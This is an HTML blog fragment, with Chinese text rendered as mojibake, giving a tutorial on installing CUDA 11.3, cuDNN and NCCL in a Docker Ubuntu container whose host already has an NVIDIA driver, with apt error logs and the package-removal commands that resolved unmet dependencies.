        <content type="html"><![CDATA[<h2 id="é€‰æ‹©åˆé€‚çš„ç‰ˆæœ¬">é€‰æ‹©åˆé€‚çš„ç‰ˆæœ¬</h2><ol type="1"><li><p>æŸ¥çœ‹è‡ªå·± Linuxå‘è¡Œç‰ˆä¸ç‰ˆæœ¬ï¼Œå¹¶è®°ä½ï¼š<code>lsb_release -a</code></p></li><li><p>æŸ¥çœ‹æ˜¾å¡æ”¯æŒçš„æœ€é«˜ CUDAç‰ˆæœ¬ï¼š<code>nvidia-smi</code>ï¼Œä¸è¶…è¿‡å·¦ä¸Šè§’çš„å°±è¡Œ</p><p>æ³¨æ„ï¼šæ˜¯å¦å®‰è£…äº† NVIDIA æ˜¾å¡é©±åŠ¨ï¼Œ<code>nvidia-smi</code>å‘½ä»¤ç¬¬ä¸€è¡Œå¦‚æœæ˜¾ç¤ºé©±åŠ¨ç‰ˆæœ¬è¯´æ˜å·²ç»å®‰è£…äº† ç”±äºæˆ‘ä½¿ç”¨çš„æ˜¯ dockerè™šæ‹ŸåŒ–å‡ºæ¥ Ubuntu20.04ä¸”ä¸»æœºå·²ç»ç»™å®‰è£…äº†é©±åŠ¨ï¼Œå› æ­¤ï¼Œè¿™é‡ŒæŸ¥çœ‹çš„æ—¶å€™æ˜¾ç¤ºå®‰è£…äº† 510ç‰ˆæœ¬çš„é©±åŠ¨ã€‚<code>NVIDIA-SMI 510.68.02 Driver Version: 510.68.02 CUDA Version: 11.6</code>ï¼Œè€Œæ­£å› ä¸ºè¿™ä¸ªåŸå› ï¼Œæˆ‘åé¢å®‰è£…CUDA é‡‡ç”¨ deb æœ¬åœ°å®‰è£…æ–¹å¼æ‰ä¸€ç›´å¤±è´¥ï¼Œå› ä¸ºè¯¥å®‰è£…æ–¹å¼ CUDAä¼šè‡ªåŠ¨ç»™ä½ é€‰æ‹©å®‰è£…ä¸€ä¸ªæ˜¾å¡é©±åŠ¨ï¼Œå¯¼è‡´æ–°å®‰è£…çš„é©±åŠ¨éœ€è¦è¦†å†™æ—§çš„é©±åŠ¨çš„æŸäº›ä½ç½®ï¼Œç„¶è€Œè™šæ‹Ÿé•œåƒæ²¡æœ‰æƒé™ä¹Ÿä¸èƒ½å¤Ÿè¦†å†™ä¸»æœºçš„ä¸€äº›ä½ç½®ï¼Œå¯¼è‡´ä¸€è‡´å‡ºç°äº†<code>unable to make backup link of</code>çš„é”™è¯¯ï¼Œå¯¼è‡´æ–° driver çš„æŸäº›ä¾èµ–å®‰è£…ä¸ä¸Šï¼Œå¯¼è‡´ä¸€äº› cudaã€driverçš„ä¾èµ–ä¸æ»¡è¶³ã€‚</p><p>è¿™é‡Œä¹Ÿæœ‰ä¸ªç½‘å‹æµ‹è¯•çš„ NVIDIA æ˜¾å¡é©±åŠ¨ä¸ CUDA ç‰ˆæœ¬çš„å…¼å®¹åˆ—è¡¨ï¼Œå¯ä»¥å‚è€ƒ<ahref="https://forums.developer.nvidia.com/t/ubuntu-install-specific-old-cuda-drivers-combo/214601/5">Ubuntuinstall specific old cuda drivers combo - Graphics / Linux / Linux -NVIDIA Developer Forums</a></p></li><li><p>æŸ¥çœ‹ä½ æ‰€ç”¨çš„æœºå™¨å­¦ä¹ æ¡†æ¶ï¼šTensorFlow,PyTorchï¼ŒMxnet(è¿™ä¸ªå±äºæ˜¯è®ºæ–‡ä»£ç å¤ç°éœ€è¦)</p><ol type="1"><li><p>pytorch</p><p>pytorch æ”¯æŒçš„ cuda ç‰ˆæœ¬ï¼š<ahref="https://pytorch.org/get-started/locally/">Start Locally |PyTorch</a>ï¼Œçœ‹åˆ°å®ƒæ”¯æŒ 10.2 å’Œ 11.3ï¼Œè¿˜æ˜¯æ–°çš„æ¯”è¾ƒå¥½ï¼Œæš‚å®š 11.3</p></li><li><p>TensorFlow</p><p>ç”±<a href="https://www.tensorflow.org/install/source#gpu">Build fromsource Â |Â  TensorFlow</a>å¯çŸ¥ï¼ŒTensorFlow2.2.0-TensorFlow2.9.0éƒ½æ”¯æŒæˆ‘æœ¬æœºçš„ Python 3.8 ç‰ˆæœ¬ï¼Œç„¶å CUDA æ–°çš„æ”¯æŒåˆ° 11.2ï¼Œäºæ˜¯è¯´æ˜ 11.3åº”è¯¥ä¹Ÿå¯ä»¥ï¼ˆå¤§ç‰ˆæœ¬å…¼å®¹ï¼‰</p></li><li><p>mxnet</p><p>æœ€è¿‘è®ºæ–‡å¤ç°ç”¨åˆ°,ç”±<a href="https://pypi.org/project/mxnet/">mxnet Â·PyPI</a>å’Œ<ahref="https://mxnet.apache.org/versions/1.9.1/get_started?platform=linux&amp;language=python&amp;processor=gpu&amp;environ=pip&amp;">GetStarted | Apache MXNet</a>å¾—çŸ¥ï¼Œmxnet æœ€æ–°çš„æ”¯æŒ CUDA11.2ï¼Œå› æ­¤å¯è¡Œ</p></li></ol></li></ol><p>æœ€åå†³å®šå®‰è£… CUDA 11.3</p><h2 id="cuda-å®‰è½¬">CUDA å®‰è½¬</h2><p>å¦‚æœæ˜¯æœ¬æœºçš„è¯ï¼Œå¯ä»¥æŒ‰ç…§å®˜æ–¹æ•™ç¨‹æ¥ï¼ˆCtrl+Fï¼š ubuntuï¼‰ï¼š<ahref="https://docs.nvidia.com/cuda/cuda-installation-guide-linux/index.html">InstallationGuide Linux :: CUDA Toolkit Documentation</a> å¦‚æœæ˜¯å·²ç»è¢«ä¸»æœºå®‰è£…äº†nvidia driver çš„ docker é•œåƒæ¥è¯´ï¼Œå®‰è£…æ­¥éª¤å¦‚ä¸‹ï¼š</p><p>å®‰è£…å¿…è¦çš„å·¥å…·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># system update</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line"># install other import packages</span><br><span class="line">sudo apt-get install gcc g++ freeglut3-dev build-essential libx11-dev libxmu-dev libxi-dev libglu1-mesa libglu1-mesa-dev</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…-cuda">1. å®‰è£… cuda</h3><p>å»å®˜ç½‘<a href="https://developer.nvidia.com/cuda-downloads">CUDAToolkit 11.7 Downloads | NVIDIADeveloper</a>ä¸‹è½½æŒ‡å®šç‰ˆæœ¬ï¼Œæ³¨æ„é€‰å¯¹å‘è¡Œç‰ˆåŠå…¶ç‰ˆæœ¬ä»¥åŠ cuda ç‰ˆæœ¬æˆ‘çš„æ˜¯ï¼šlinuxx86_64ï¼Œubuntu20.04ï¼Œrunfile(local)ï¼Œ<strong>å®‰è£…æ–¹å¼æ³¨æ„é€‰æ‹©<code>runfile(local)</code></strong>,<code>deb(local)</code>ä¼šç»™ä½ é»˜è®¤å®‰è£…æ¨èçš„é©±åŠ¨ï¼Œå¯èƒ½ï¼ˆåœ¨æˆ‘è¿™é‡Œå°±æ˜¯ï¼‰ä¸å·²å®‰è£…çš„é©±åŠ¨å†²çªã€‚æˆ‘çš„å®‰è£…é“¾æ¥ï¼š<ahref="https://developer.nvidia.com/cuda-11.3.0-download-archive?target_os=Linux&amp;target_arch=x86_64&amp;Distribution=Ubuntu&amp;target_version=20.04&amp;target_type=runfile_local">CUDAToolkit 11.3 Downloads | NVIDIA Developer</a></p><p>é€‰å¥½åï¼ŒæŒ‰ç…§æŒ‡ä»¤ä¸‹è½½å®‰è£…å³å¯ã€‚</p><p>é€‰æ‹© continue <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530194403.png"alt="20220530194403" /></p><p>æ‰‹åŠ¨è¾“å…¥ accept <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530194447.png"alt="20220530194447" /></p><p><strong>å®‰è£…å‰å–æ¶ˆå‹¾é€‰driverï¼ˆç§»åŠ¨å…‰æ ‡åˆ°è¯¥ä½ç½®ï¼Œå›è½¦ï¼‰</strong>ï¼Œä»è€Œå®ç°åªå®‰è£… cuda ä¸å®‰è£…nvidia driver <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220530194544.png"alt="20220530194544" /></p><p>è®¾ç½® cuda ç¯å¢ƒå˜é‡,æ³¨æ„å¦‚æœä½¿ç”¨ zshï¼Œåˆ™æ”¹æˆ <code>~/.zshrc</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;export PATH=/usr/local/cuda-11.3/bin:$PATH&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">echo &#x27;export LD_LIBRARY_PATH=/usr/local/cuda-11.3/lib64:$LD_LIBRARY_PATH&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">source ~/.bashrc</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…-cudnn">2.å®‰è£… CuDNN</h3><p>CuDNN å®‰è£…å®é™…ä¸Šå°±æ˜¯ä¸‹è½½ä¸€äº›åº“ï¼Œç„¶åå¤åˆ¶åˆ° CUDA çš„å¯¹åº”ä½ç½®ã€‚</p><p>è¿›å…¥ <a href="https://developer.nvidia.com/rdp/cudnn-archive">cuDNNArchive | NVIDIA Developer</a>ï¼Œé€‰æ‹©ä¸ CUDA ç‰ˆæœ¬å¯¹åº” CuDNNï¼Œæˆ‘è¿™é‡Œå› ä¸ºæ˜¯CUDA 11.3 å› æ­¤é€‰æ‹©æœ€æ–°çš„ cuDNN v8.4.0 (April 1st, 2022), for CUDA11.xï¼Œç„¶åé€‰æ‹©<strong><code>Local Installer for Linux x86_64 (Tar)</code></strong></p><blockquote><p>æ³¨æ„ï¼šæˆ‘é€‰æ‹©ä½¿ç”¨ Local Installer for Ubuntu20.04 x86_64 (Deb)çš„æ—¶å€™æ²¡å®‰è£…å¥½ï¼Œåé¢ä½¿ç”¨ tar å®‰è£…æ‰å®‰è£…å¥½ã€‚</p></blockquote><p>å½“ä½ é€‰å¥½ä¹‹åï¼Œç‚¹å‡»åº”è¯¥ä¼šè®©ä½ æ³¨å†Œæ‰èƒ½å¤Ÿè·å¾—ä¸‹è½½é“¾æ¥ï¼Œæ³¨å†Œå°±å¥½.ç„¶åå®‰è£…å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># ä¸‹è½½ cuDNNï¼Œå¹¶è§£å‹</span><br><span class="line">wget url cudnn.tar.xz</span><br><span class="line">tar -xvf cudnn.tar.xz</span><br><span class="line"></span><br><span class="line"># å¤åˆ¶ä»¥ä¸‹æ–‡ä»¶åˆ° cuda toolkit directory.</span><br><span class="line">sudo cp -P cudnn/include/cudnn.h /usr/local/cuda-11.3/include</span><br><span class="line">sudo cp -P cudnn/lib/libcudnn* /usr/local/cuda-11.3/lib64/</span><br><span class="line">sudo chmod a+r /usr/local/cuda-11.3/lib64/libcudnn*</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…-nccl">3. å®‰è£… nccl</h3><p>ä¸€äº›æœºå™¨å­¦ä¹ æ¡†æ¶è¿˜éœ€è¦å®‰è£… ncclï¼Œä¾‹å¦‚ï¼šMxnet,å¦‚æœæœªå®‰è£…ï¼Œåˆ™æŠ¥é”™å¦‚ä¸‹(CuDNN ç±»ä¼¼ libcudnn)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OSError: libnccl.so.2: cannot open shared object file: No such file or directory</span><br></pre></td></tr></table></figure><p>å®‰è£…æ­¥éª¤ä¸ CuDNN ç±»ä¼¼ï¼Œå®‰è£…é“¾æ¥ï¼š<ahref="https://developer.nvidia.com/nccl/nccl-download">NVIDIA CollectiveCommunications Library (NCCL) Download Page | NVIDIA Developer</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">download</span></span><br><span class="line">wget url</span><br><span class="line">tar -xvf nccl.txz</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">copy</span></span><br><span class="line">sudo cp -P nccl/include/* /usr/local/cuda-11.3/include/</span><br><span class="line">sudo cp -P nccl/lib/libnccl* /usr/local/cuda-11.3/lib64/</span><br><span class="line">sudo chmod a+r /usr/local/cuda-11.3/lib64/libncc*</span><br></pre></td></tr></table></figure><h3 id="éªŒè¯å®‰è£…æˆåŠŸ">4. éªŒè¯å®‰è£…æˆåŠŸ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi</span><br><span class="line">nvcc -V</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…å¯¹åº”çš„æœºå™¨å­¦ä¹ æ¡†æ¶">5. å®‰è£…å¯¹åº”çš„æœºå™¨å­¦ä¹ æ¡†æ¶</h3><ol type="1"><li><p>pytorch <a href="https://pytorch.org/get-started/locally/">StartLocally | PyTorch</a></p></li><li><p>mxnet</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda install mxnet-cuda112</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">or</span></span><br><span class="line">pip install mxnet-cuda112</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="è¸©å‘çš„é”™è¯¯">è¸©å‘çš„é”™è¯¯</h2><blockquote><p>å¤ªé•¿ä¸æ•™ç¨‹æ— å…³ï¼Œä¸ç”¨çœ‹ç³»åˆ—</p></blockquote><p>å¦‚æœæ˜¯ä¸»æœºçš„è¯ï¼Œæ¨èå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># install tools for lspci, ubuntu-drivers, add-apt-repository</span></span></span><br><span class="line">sudo apt install pciutils ubuntu-drivers-common software-properties-common</span><br></pre></td></tr></table></figure><p>é€šè¿‡ ubuntu-drivers è¯†åˆ«æ¨èçš„é©±åŠ¨ï¼Œå¹¶å®‰è£…,çœ‹ "recommended"é‚£ä¸€è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ubuntu-drivers devices</span></span><br><span class="line">== /sys/devices/pci0000:00/0000:00:01.0/0000:01:00.0 ==</span><br><span class="line">modalias : pci:v000010DEd00001C03sv00001043sd000085ABbc03sc00i00</span><br><span class="line">vendor   : NVIDIA Corporation</span><br><span class="line">model    : GP106 [GeForce GTX 1060 6GB]</span><br><span class="line">driver   : nvidia-driver-440 - distro non-free recommended</span><br><span class="line">driver   : nvidia-driver-390 - distro non-free</span><br><span class="line">driver   : nvidia-driver-435 - distro non-free</span><br><span class="line">driver   : xserver-xorg-video-nouveau - distro free builtin</span><br></pre></td></tr></table></figure><p>å¸è½½åˆšåˆšå®‰è£…çš„æ˜¾å¡é©±åŠ¨çš„å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove nvidia-driver-515</span><br><span class="line">sudo dpkg --configure -a</span><br><span class="line">sudo apt-get -f install</span><br><span class="line">sudo apt autoremove</span><br></pre></td></tr></table></figure><h3 id="unmet-dependencies-é—®é¢˜">unmet dependencies é—®é¢˜</h3><p>åŸå› æ˜¯ï¼šä¸»æœºå·²ç»å®‰è£…äº† nvidia é©±åŠ¨ï¼Œdocker é•œåƒé‡Œé¢å®‰è£… cudaçš„æ—¶å€™ï¼Œä¼šå†ç»™ä½ å®‰è£…é©±åŠ¨ï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿï¼Œæ–‡ä»¶ç³»ç»Ÿéš”ç¦»å¯¼è‡´æ–°é©±åŠ¨æ— æ³•å®‰è£…æˆåŠŸï¼Œç„¶è€Œå…¶ä»–çš„åŒ…å·²ç»å®‰è£…äº†ï¼Œcudaä¹Ÿå®‰è£…äº†ä¸€éƒ¨åˆ†äº†ï¼Œè¿™å°±å½¢æˆäº† unmetdependenciesã€‚<strong>è§£å†³åŠæ³•ï¼šä¸€è¡Œå‘½ä»¤ä¸€èµ·å¸è½½</strong>ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@e2ac535b1b1f:~$ sudo apt install nvidia-compute-utils-515 nvidia-utils-515</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  nvidia-compute-utils-515 nvidia-utils-515</span><br><span class="line">0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.</span><br><span class="line">45 not fully installed or removed.</span><br><span class="line">Need to get 608 kB of archives.</span><br><span class="line">After this operation, 1966 kB of additional disk space will be used.</span><br><span class="line">Get:1 https://developer.download.nvidia.cn/compute/cuda/repos/ubuntu2004/x86_64  nvidia-compute-utils-515 515.43.04-0ubuntu1 [271 kB]</span><br><span class="line">Get:2 https://developer.download.nvidia.cn/compute/cuda/repos/ubuntu2004/x86_64  nvidia-utils-515 515.43.04-0ubuntu1 [337 kB]</span><br><span class="line">Fetched 608 kB in 1s (998 kB/s)</span><br><span class="line">debconf: delaying package configuration, since apt-utils is not installed</span><br><span class="line">(Reading database ... 92572 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking nvidia-compute-utils-515 (515.43.04-0ubuntu1) ...</span><br><span class="line">dpkg: error processing archive /var/cache/apt/archives/nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb (--unpack):</span><br><span class="line"> unable to make backup link of &#x27;./usr/bin/nvidia-cuda-mps-control&#x27; before installing new version: Invalid cross-device link</span><br><span class="line">dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)</span><br><span class="line">Preparing to unpack .../nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking nvidia-utils-515 (515.43.04-0ubuntu1) ...</span><br><span class="line">dpkg: error processing archive /var/cache/apt/archives/nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb (--unpack):</span><br><span class="line"> unable to make backup link of &#x27;./usr/bin/nvidia-debugdump&#x27; before installing new version: Invalid cross-device link</span><br><span class="line">dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)</span><br><span class="line">Do you want to continue? [Y/n]</span><br><span class="line"><span class="meta prompt_">0% </span><span class="language-bash">[Working]</span></span><br><span class="line">Get:1 https://developer.download.nvidia.cn/compute/cuda/repos/ubuntu2004/x86_64  nvidia-compute-utils-515 515.43.04-0ubuntu1 [271 kB]</span><br><span class="line">Get:2 https://developer.download.nvidia.cn/compute/cuda/repos/ubuntu2004/x86_64  nvidia-utils-515 515.43.04-0ubuntu1 [337 kB]</span><br><span class="line">Fetched 608 kB in 1s (1000 kB/s)</span><br><span class="line">debconf: delaying package configuration, since apt-utils is not installed</span><br><span class="line">(Reading database ... 50%</span><br><span class="line">(Reading database ... 95%</span><br><span class="line">(Reading database ... 92572 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking nvidia-compute-utils-515 (515.43.04-0ubuntu1) ...</span><br><span class="line">dpkg: error processing archive /var/cache/apt/archives/nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb (--unpack):</span><br><span class="line"> unable to make backup link of &#x27;./usr/bin/nvidia-cuda-mps-control&#x27; before installing new version: Invalid cross-device link</span><br><span class="line">dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)</span><br><span class="line"></span><br><span class="line">Preparing to unpack .../nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb ...</span><br><span class="line">Unpacking nvidia-utils-515 (515.43.04-0ubuntu1) ...</span><br><span class="line"></span><br><span class="line">dpkg: error processing archive /var/cache/apt/archives/nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb (--unpack):</span><br><span class="line"> unable to make backup link of &#x27;./usr/bin/nvidia-debugdump&#x27; before installing new version: Invalid cross-device link</span><br><span class="line">dpkg-deb: error: paste subprocess was killed by signal (Broken pipe)</span><br><span class="line"></span><br><span class="line">Errors were encountered while processing:</span><br><span class="line"> /var/cache/apt/archives/nvidia-compute-utils-515_515.43.04-0ubuntu1_amd64.deb</span><br><span class="line"> /var/cache/apt/archives/nvidia-utils-515_515.43.04-0ubuntu1_amd64.deb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E: Sub-process /usr/bin/dpkg returned an error code (1)</span><br><span class="line"></span><br><span class="line">ubuntu@e2ac535b1b1f:~$ sudo apt remove cuda-drivers nvidia-driver-515 cuda-drivers-515</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">You might want to run &#x27;apt --fix-broken install&#x27; to correct these.</span><br><span class="line">The following packages have unmet dependencies:</span><br><span class="line"> cuda-runtime-11-3 : Depends: cuda-drivers (&gt;= 465.19.01) but it is not going to be installed</span><br><span class="line">E: Unmet dependencies. Try &#x27;apt --fix-broken install&#x27; with no packages (or specify a solution).</span><br><span class="line">ubuntu@e2ac535b1b1f:~$ sudo apt remove cuda-drivers nvidia-driver-515 cuda-drivers-515 cuda-runtime-11-3</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">You might want to run &#x27;apt --fix-broken install&#x27; to correct these.</span><br><span class="line">The following packages have unmet dependencies:</span><br><span class="line"> cuda-11-3 : Depends: cuda-runtime-11-3 (&gt;= 11.3.1) but it is not going to be installed</span><br><span class="line"> cuda-demo-suite-11-3 : Depends: cuda-runtime-11-3 but it is not going to be installed</span><br><span class="line">E: Unmet dependencies. Try &#x27;apt --fix-broken install&#x27; with no packages (or specify a solution).</span><br></pre></td></tr></table></figure><p>æ‰¾äº†å…¨ç½‘å„ç§ç›¸ä¼¼çš„é—®é¢˜ä¹Ÿæ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œæœ€ååœ¨ä¸€ä¸ªå…„å¼Ÿçš„åšå®¢<ahref="https://haulyn5.cn/2020/10/15/NVIDIA-Driver-bug-201015/">NVIDIA-Driver-bug-201015| Haulyn5 çš„åšå®¢</a>æ‰¾åˆ°äº†ã€‚</p><p>æ—¢ç„¶æ— æ³•å®‰è£…å®Œæ•´çš„åŒ…ï¼Œé‚£å°±å¸è½½ï¼Œä½†æ˜¯å•ç‹¬çš„å¸è½½æŸä¸ªåŒ…éƒ½ä¼šå‡ºé—®é¢˜æŠ¥é”™ï¼Œå¿…é¡»å°†å‡ ä¸ªæœ‰é—®é¢˜çš„åŒ…ä¸€èµ·å¸è½½æ‰å¯ä»¥ã€‚ä½ å¯ä»¥è¾“å…¥ä¸€ä¸ªï¼Œç„¶åå®ƒåˆå‡ºç°äº†åŒ…æ— æ³•å®‰è£…ï¼Œä½ å†æ·»åŠ åˆ°å‘½ä»¤ä¸Šï¼Œæœ€åå®Œæ•´çš„å‘½ä»¤å‘½ä»¤ï¼š<code>sudo apt remove cuda-drivers nvidia-driver-515 cuda-drivers-515 cuda-runtime-11-3 cuda-11-3 cuda-demo-suite-11-3</code>æ‰§è¡Œç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">A new initrd image has also been created. To revert, please regenerate your</span><br><span class="line">initrd by running the following command after deleting the modprobe.d file:</span><br><span class="line">`/usr/sbin/initramfs -u`</span><br><span class="line"></span><br><span class="line">*****************************************************************************</span><br><span class="line">*** Reboot your computer and verify that the NVIDIA graphics driver can   ***</span><br><span class="line">*** be loaded.                                                            ***</span><br><span class="line">*****************************************************************************</span><br><span class="line"></span><br><span class="line">INFO:Enable nvidia</span><br><span class="line">DEBUG:Parsing /usr/share/ubuntu-drivers-common/quirks/put_your_quirks_here</span><br><span class="line"> dependency problems - leaving unconfigured</span><br><span class="line">Processing triggers for mime-support (3.64ubuntu1) ...</span><br><span class="line">Processing triggers for gnome-menus (3.36.0-1ubuntu1) ...</span><br><span class="line">Processing triggers for libc-bin (2.31-0ubuntu9.9) ...</span><br><span class="line">Processing triggers for man-db (2.9.1-1) ...</span><br><span class="line">Processing triggers for dbus (1.12.16-2ubuntu2.2) ...</span><br><span class="line">Processing triggers for desktop-file-utils (0.24-1ubuntu3) ...</span><br><span class="line">Errors were encountered while processing:</span><br><span class="line"> cuda-toolkit-11-3-config-common</span><br><span class="line"> libnvjpeg-11-3</span><br><span class="line"> libnvjpeg-dev-11-3</span><br><span class="line"> cuda-cudart-11-3</span><br><span class="line"> cuda-cudart-dev-11-3</span><br><span class="line"> cuda-libraries-dev-11-3</span><br><span class="line"> libnpp-11-3</span><br><span class="line"> libcusparse-11-3</span><br><span class="line"> libcurand-11-3</span><br><span class="line"> cuda-visual-tools-11-3</span><br><span class="line"> libcufft-11-3</span><br><span class="line"> libcusparse-dev-11-3</span><br><span class="line"> libcusolver-11-3</span><br><span class="line"> cuda-cupti-11-3</span><br><span class="line"> libcublas-11-3</span><br><span class="line"> cuda-samples-11-3</span><br><span class="line"> libcurand-dev-11-3</span><br><span class="line"> libcublas-dev-11-3</span><br><span class="line"> cuda-nvcc-11-3</span><br><span class="line"> libnpp-dev-11-3</span><br><span class="line"> cuda-libraries-11-3</span><br><span class="line"> cuda-documentation-11-3</span><br><span class="line"> cuda-compiler-11-3</span><br><span class="line"> cuda-cupti-dev-11-3</span><br><span class="line"> cuda-toolkit-11-3</span><br><span class="line"> libcufft-dev-11-3</span><br><span class="line"> libcusolver-dev-11-3</span><br><span class="line"> cuda-tools-11-3</span><br><span class="line"> cuda-command-line-tools-11-3</span><br><span class="line">E: Sub-process /usr/bin/dpkg returned an error code (1)</span><br></pre></td></tr></table></figure><p>æœ€åå†æ‰§è¡Œä»¥ä¸‹ï¼š<code>sudo apt autoremove</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo 